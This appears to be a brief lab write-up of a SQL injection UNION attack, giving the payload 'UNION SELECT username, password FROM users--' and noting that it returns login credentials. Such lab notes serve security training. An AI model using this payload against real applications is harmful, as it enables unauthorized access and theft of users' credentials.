SQL injection UNION attack, retrieving data from other tables

Endpoint: find the username and password using UNION attack

Analysis:

UNION SELECT username, password FROM users--

-- gives the username and passowrd for login 